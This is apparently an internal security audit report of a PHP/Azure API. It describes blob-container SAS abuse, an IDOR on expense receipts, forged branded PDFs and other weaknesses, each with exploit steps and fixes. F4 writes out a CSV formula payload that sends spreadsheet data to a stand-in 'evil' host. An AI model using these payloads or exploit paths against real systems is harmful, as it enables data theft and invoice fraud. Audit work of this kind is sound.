# 04: Injection, file handling, SSRF and dangerous sinks

Scope: `src/`, `core/src`, `core/python`, `public/`, `deploy/app-service`. This was a read-only review; nothing in the repository was changed.
Route guards were checked in `src/Bootstrap/AppBuilder.php`. Line numbers refer to the copy at `/home/user/tricab-api`.

## Summary

| # | Title | Severity | Confidence |
|---|-------|----------|------------|
| F1 | Product media "add" lets a product editor choose the blob container, so the API signs read SAS URLs for any container in the storage account (HR onboarding, finance, RFQ and expense files). The URLs can also reach anonymous users | High | Confirmed (code path); Likely for prod config |
| F2 | Expense attachment "complete" trusts a client-supplied `blobPath`, so a user can attach and read another user's receipt and cause its later deletion | Medium (High if paths leak) | Confirmed |
| F3 | Any registered user (customers included) can render TriCab-branded quotation, order and pick-list PDFs from arbitrary OCR input | Medium | Likely |
| F4 | CSV formula injection in the TriExpense CSV exports | Medium | Confirmed |
| F5 | Expense direct-to-blob upload: Content-Type and size are not enforced after the SAS is issued, and blob names are predictable or can collide | Low | Confirmed |
| F6 | Product write SAS tickets stay valid after completion (up to 1 h), and the 3D-preview "complete" step accepts a client-chosen container and path | Low | Confirmed |
| F7 | Finance Task and AR files are served with the uploader's Content-Type (`?inline=1`). The CSP sandbox mitigates this | Info | Confirmed |
| F8 | The quotegen inspector sandbox runs arbitrary Python by design, shares one file store across all callers, and is not wired into the API | Info | Confirmed |
| F9 | The Python service dependencies in `core/python/requirements.txt` are unpinned, and `defusedxml` is not installed for openpyxl | Info | Confirmed |
| F10 | Stable media URLs take their origin from `X-Forwarded-Host` when `PUBLIC_API_ORIGIN` is unset | Info | Needs verification |

No SQL injection, OS command injection, XXE, unsafe deserialization from requests, or user-controlled SSRF was found. Details are under "Areas checked and found correct".

---

## F1. Product editors can get read SAS URLs for any blob in the storage account (High)

**Where**
- `src/Http/Request/Admin/Product/AddProductMediaRequest.php:42-52`: `storagePath`, `storageContainer` and `publicUrl` are taken straight from the JSON body.
- `core/src/Product/Application/Service/AddProductMediaService.php:30,40,48`: only `storagePath` is validated (`MediaStoragePath`: charset and no `..`). `storageContainer` and `publicUrl` are stored unchanged.
- `src/Product/Persistence/AzureSqlProductMediaRepository.php:263-305`: `StorageContainer` and `PublicUrl` are inserted. `UploadStatusCode` defaults to `active` (`database/scripts/development/alter-product-file-upload-phase9.sql:19`).
- `src/Http/Action/Admin/ProductManagementDtoSerializer.php:813-819` (`mediaSummary`) → `resolveAssetUrl` (`:1852`) → `src/Product/Storage/ProductDevMediaUrlResolver.php:43-55, 86-124` (`signPrivateAzureReadUrl`):
  ```php
  $container = $storageContainer ...;            // from the DB row = attacker-chosen
  ...
  if (($container === null || $path === null) && $storedUrl !== null) {
      $parsed = $this->parseOwnAzureBlobUrl($storedUrl);   // any container in our account
  ...
  $ticket = $this->blobStore->issueReadDownload($container, $path, ...);
  return $ticket->uploadUrl;
  ```
- One `ProductBlobStore` (`AzureProductBlobStore` with `AzureBlobAccountSasIssuer`, a single `BLOB_ACCOUNT_KEY`) holds every private container: `onboarding` (`ContainerFactory.php:2011-2016`), `rfq-documents` (`:3833-3838`), `finance-attachments` (`:3897-3909`), `triexpense`, `products`. `connection-string` is the only non-dev `BLOB_AUTH_MODE` (`src/Config/Settings.php:95-97`), so it is the production mode.

**Exploit**
1. A staff user with `PRODUCT.MEDIA.MANAGE` (route `POST /api/v1/admin/products/{id}/media`, `AppBuilder.php:1894`) sends `{"storageContainer":"onboarding","storagePath":"<path>", ...}`. Alternatively they omit the container and set `publicUrl` to `https://<acct>.blob.core.windows.net/finance-attachments/<path>`.
2. Every media response (admin list and the add response itself) returns a read SAS URL for that blob, valid for `blobDownloadSasTtlSeconds`.
3. The anonymous route `GET /api/v1/products/{slug}/media` (`AppBuilder.php:1833`, `GetPublicProductMediaAction.php:42-44`) uses the same serializer. `stabilizePayload` only rewrites `products`-container images, so on a published product the foreign-container SAS URL goes to anonymous visitors.

**Prerequisite:** the attacker needs a blob path. Expense paths are predictable (see F2). Onboarding, RFQ and finance paths come from their own path builders and may be guessable. The SAS is read-only. Impact: a product-content editor can read payroll and onboarding PDFs, staff photos, finance attachments and receipts, and can publish them to the internet.

**Fix**
- Never take `storageContainer` from the client. Set it server-side to `blobContainerProducts`, and refuse or ignore `publicUrl` that points at the storage account (or any URL that is not `https`).
- In `ProductDevMediaUrlResolver::signPrivateAzureReadUrl`, only sign when `$container === $settings->blobContainerProducts` (or an allowlist of product containers).
- Long term, issue SAS per container with separate keys or user-delegation SAS scoped to one container.

---

## F2. Expense attachment completion takes a client-chosen blob path (IDOR to read or destroy another user's receipt) (Medium)

**Where**
- `src/Http/Action/TriExpense/CompleteExpenseAttachmentAction.php:39`: `blobPath` comes from the request body.
- `core/src/Expense/Application/Service/CompleteExpenseAttachmentService.php:50-55`:
  ```php
  if (!$this->attachments->objectExists($blobPath)) { ... }
  $receipt->replaceAttachment(ExpenseAttachmentRef::azureBlob($blobPath, $fileName), ...);
  ```
  The service only checks that the blob exists. It does not check that the path was issued by `InitiateExpenseAttachmentService`, or that it sits under the caller's prefix.
- Read: `GetExpenseAttachmentFileService.php:62-70` issues a read SAS for whatever path the receipt now references.
- Delete: `PurgeExpenseReceiptService.php:47,103` (`purgeExpired` runs as a scheduled job with no actor, `RECYCLE_DAYS = 30`) calls `deleteIfManaged` on the referenced path.
- The path format is predictable: `InitiateExpenseAttachmentService.php:67-76` builds `Y/F/<login>/<login>_<YmdHis>.<ext>`.

**Exploit**
Any staff user with `TRIEXPENSE.ACCESS` (`AppBuilder.php:1527-1529`):
1. Creates their own receipt.
2. Calls `/receipts/{own}/attachment/complete` with `blobPath = 2026/November/jsmith/jsmith_20261103_101512.pdf`.
3. Calls `/receipts/{own}/file` and receives a read SAS for the victim's receipt.

The existence check works as an oracle, so the path can be brute-forced, which is cheap if the upload time is roughly known (for example from an approval view). If the attacker then soft-deletes their own receipt, the scheduled purge deletes the victim's blob 30 days later. The same path also feeds OCR (`RunExpenseReceiptOcrService`) and the finance full PDF.

**Fix**
- Persist the issued `blobPath` (with receipt id, user and expiry) at initiate time, and accept only that exact value at complete.
- Or derive the path server-side and ignore the client value.
- At minimum, require the path prefix to match `Y/F/<caller-login>/` and that no other receipt references it.
- Make `deleteIfManaged` refuse paths that more than one receipt references.

---

## F3. Unprivileged users can generate branded company documents (Medium)

**Where:** `AppBuilder.php:2490` registers `$app->post('/api/v1/documents/pdf', GenerateDocumentPdfAction::class);` with no permission guard. `GenerateDocumentPdfAction.php:109-150` only checks that the caller resolves to *some* registered user. `CustomerActorStaffRouteGuardMiddleware` only protects `/api/v1/admin/*`.

**Exploit:** a customer-portal or guest account (any registered identity) posts a crafted 4js `.ocr` stream and receives a genuine-looking TriCab Quotation, Order Confirmation or Pick List PDF with arbitrary prices and addresses. This enables phishing or invoice fraud. It also exposes the `tricab/docgen` parser to untrusted input (bounded to 5 MB, `:25,61`).

**Fix:** guard the route with a staff permission (for example the quote/order document permission used by `GetQuoteTemplateDocumentAction`) and reject customer actors.

---

## F4. CSV formula injection in TriExpense exports (Medium)

**Where:** `core/src/Expense/Application/.../ExpenseFinanceViews.php:167-180` (`csvLine`) only quotes. Neither function neutralises `= + - @ \t \r`:
- `ExportEmployeeReceiptsCsvService.php:69,80`: `vendorName()` and `description()` are typed by the employee.
- `ExportFinanceReconciliationCsvService.php:103-117`: merchant fields from the bank feed, and `vendorName`.

The routes are `GET /api/v1/tri-expense/exports/receipts.csv`, `/finance/exports/reconciliation.csv` and the aliases at `AppBuilder.php:1547-1548,1562-1563`.

**Exploit:** an employee enters a description such as `=HYPERLINK("https://evil/?"&A1,"Click")` or a DDE payload. When finance opens the export in Excel, the formula runs or the data is exfiltrated.

**Fix:** reuse the existing neutraliser pattern (`MailExportService`, `Rfq/Export/SpreadsheetCsv`, `Ap2Csv`, `ExportCustomerContactReportsService.php:148`): prefix `'` to cells that start with `= + - @ \t \r`. For numeric columns, emit numbers rather than strings.

---

## F5. Expense upload constraints are not enforced on the blob (Low)

- `AzureBlobAccountSasIssuer.php:28-92`: the write SAS (`sp=cw`) signs `rsct`. That is a *response* header override and does not constrain the PUT's Content-Type or size. `CompleteExpenseAttachmentService` (unlike `CompleteProductMediaUploadService.php:59-78`) does not compare the blob's Content-Type or length with what was declared. A user can therefore store `text/html` or `image/svg+xml`, or a multi-GB blob, under a `.pdf` or `.png` name.
- Impact: the file is served via SAS from `*.blob.core.windows.net`, a different origin from the app, so the cookie/XSS impact on the app is limited. The concerns are storage abuse, and HTML or phishing content opened by finance reviewers.
- Collisions: `InitiateExpenseAttachmentService.php:67-76`. The login is the email local-part with `.` and other characters stripped (`j.smith` and `jsmith` produce the same login), and the timestamp has one-second granularity. Two users, or two uploads in the same second, overwrite each other.
- **Fix:** HEAD the blob at complete and enforce Content-Type and size; optionally sniff the magic bytes. Include a random UUID in the blob name.

## F6. Product write SAS and 3D-preview completion (Low, staff-only)

- The write SAS is valid for up to 3600 s (`AzureBlobAccountSasIssuer.php:33`). After `CompleteProductMediaUploadService` validates the Content-Type, the same SAS can overwrite the blob with other content and Content-Type (for example HTML). This only affects the blob origin.
- `Product3DModelsAdminAction.php:163-186` → `CompleteProduct3DPreviewUploadService.php:38-58` take `storageContainer` and `storagePath` from the client and store `previewImageStoragePath`. Signing then uses the model's own container (`ProductDevMediaUrlResolver`), so the reach is limited to the products container. Fix this together with F1 by deriving the path server-side.
- **Fix:** shorten the upload TTL to about 5-10 min, and use a unique blob name per upload so that a SAS cannot overwrite an activated blob.

## F7. Finance Task and AR file content type (Info)

`TaskFileService.php:195-213` and `FinanceAttachmentRules::cleanContentType` store the client-declared type (including `text/html` and `image/svg+xml`). `GetTaskFileAction.php:49-55` and `GetArAttachmentFileAction.php:49-55` serve it inline when `?inline=1`. The `Content-Security-Policy: default-src 'none'; sandbox` and `nosniff` headers block script execution and same-origin access, so this is not exploitable in modern browsers. As hardening, force `application/octet-stream` for anything outside a safe allowlist, as `Ap2FileResponse.php:18-27` already does.

## F8. quotegen_inspector sandbox (Info)

`core/python/quotegen_inspector/server.py:160-200`: `/execute` runs arbitrary Python (`python -I -c code`) under rlimits. This is by design, behind a bearer token, and the Dockerfile says `--network none`. All callers share one scratch store (`/files` lists every file, `:104-112`). The service is not deployed: no PHP client and no startup.sh entry. Before wiring it in, keep one container per conversation, enforce no network, and treat LLM-supplied code as untrusted (prompt injection from RFQ attachments).

## F9. Python supply chain and XML (Info)

`core/python/requirements.txt` is unpinned (Flask, gunicorn, openpyxl, pdfplumber, python-docx, xlrd, anthropic). Pin versions with hashes. openpyxl parses uploaded xlsx without `defusedxml`. CPython's expat does not resolve external entities, so XXE is not exposed, but adding `defusedxml` is cheap hardening against entity expansion.

## F10. Host-derived URLs (Info, needs verification)

`StableMediaUrlSigner::originFor` (`src/Product/Media/StableMediaUrlSigner.php:63-93`) uses `X-Forwarded-Host` when `PUBLIC_API_ORIGIN` is empty. If anonymous product responses are cached by a CDN, a poisoned host could be cached. Set `PUBLIC_API_ORIGIN` in production.

---

## Areas checked and found correct

- **SQL**: all `ORDER BY` sort columns go through `match`/const maps (`AzureSqlUserManagementRepository.php:667`, `AzureSqlCustomerRepository.php:454`, `AzureSqlCustomerContactRepository.php:392`, `AzureSqlProductAdminQueryRepository.php:618`, `AzureSqlArRecordStore.php:35-60`, `AzureSqlEmployeeDirectory.php:79` with `EmployeeListCriteria` allowlist). Direction is a ternary. `TOP`/`FETCH` values are `int`-typed under `strict_types`. `IN()` lists are bound placeholders or `intval`. `LIKE` values are bound with `ESCAPE` and escaping helpers. Interpolated fragments in Rfq, Onboarding, Npr and Assistant (`workflowStatusSql`, `facetLiterals`, enum `IN` lists, `effectiveStatus` with a date regex) come only from server constants or enums. Hardening note only: `AzureSqlArRecordStore.php:470` interpolates a regex-validated date. The legacy MySQL/Postgres migration readers interpolate table and column names from constants, are CLI-only, and are not reachable over HTTP.
- **OS commands**: `LegacyCliTriCalcEngine.php:39` and `ProcOpenAzureCliProcessRunner.php:29` use array-form `proc_open` (no shell) with config-only arguments. Python `cost_api.py:336` and `quotegen_inspector/docx.py:42` use list-form `subprocess.run` with server paths. `GenerateOcrPdfService` is pure PHP (docgen) with no external binaries. No exec/system/backticks/Symfony Process, and no ghostscript, imagemagick, ocrmypdf or HEIC CLI.
- **Uploads**: product image/document/CAD/AR/3D allowlists (`ProductFileValidationPolicy`, no SVG/HTML) plus HEAD verification of Content-Type and length at completion. NPR uses finfo sniffing (`NprAttachmentRules.php:65`). CCR checks content sniffing against the extension (`CustomerContactReportFilePolicy.php:67-79`). Onboarding photos and signatures are decoded as JPEG/PNG value objects. Product image metadata uses `getimagesizefromstring` only. The NPR zip check only inspects, with no extraction (no zip slip).
- **Downloads**: NPR, Mail, RFQ, AP2, Task, AR and Onboarding send `nosniff`. Most use `attachment` or a CSP sandbox. Filenames are sanitised, and Slim PSR-7 rejects CR/LF in headers. Stable media tokens are HMAC'd (`StableMediaUrlSigner::verify`, with `..` rejected and limited to the products container and image extensions).
- **public/**: `router.php` (built-in dev server only) refuses `..` and serves only `is_file` under `public/`; percent-encoding is not decoded before `is_file`. `PublicMediaDirectory` uses fixed paths. nginx denies `/app/`, dotfiles and `*.php`, and serves `/media`, `/assets` etc. via `try_files $uri` with no alias traversal. Unverified: what `/finance-files/` (served publicly at `default:258`) contains.
- **SSRF**: every outbound URL is config or constant (Graph, Odoo, Foundry, Postmark, 4Js with `CURLOPT_PROTOCOLS` and no redirects, JWKS, Product Finder, RFQ parser, Finance AI). Graph `nextLink` is restricted to Graph. CableFit research uses the model's server-side `web_search` with `allowed_domains`. `Phase4HTechnicalDocumentMigrator` fetches URLs from migration data and is CLI-only. No `file_get_contents`, `fopen` or `include` takes request-derived paths: migration admin JSON paths are fixed under `core/docs`.
- **Deserialization/XML**: `unserialize` appears only in in-memory test stores and in the dev-only `DevelopmentFileCustomerContactReportRepository.php:208` (local file). `DOMDocument` is used only in the CLI handbook importer. No `eval`, no `preg_replace /e`, and no class instantiation from input. Python's `pickle` loads only a private local catalogue cache (`tricab_cable_rules/data.py:462-510`). No `yaml.load`.
- **Python services**: product_finder, rfq_parser and finance_ai bind to 127.0.0.1 (`startup.sh:46,246,308`) with no nginx location. The `/v1` contracts require a constant-time bearer token and fail closed when it is unset (`rfq_parser/contract.py:126-130`, `finance_ai/contract.py:85-89`). The legacy `/api/parse/*` and finder routes have no auth and CORS `*`, but are loopback-only (Info). Uploaded RFQ files are written under generated temp names with a suffix allowlist and a 25 MB cap.
- **Email**: messages go through Graph JSON (no raw headers). `FinanceMimeBuilder` strips CR/LF from every header, uses RFC 2047 for the subject, and sanitises attachment names.
- **PDF/HTML**: Dompdf is used with `isRemoteEnabled=false` and `isPhpEnabled=false` (`ExpenseDompdfRenderer.php:15-18`), and the expense HTML escapes all values with `htmlspecialchars`. FPDI/FPDF templates take no HTML.
- **HTML output**: the API emits no `text/html`. Mail bodies are returned as JSON strings, and the frontend must render them sandboxed (out of scope).
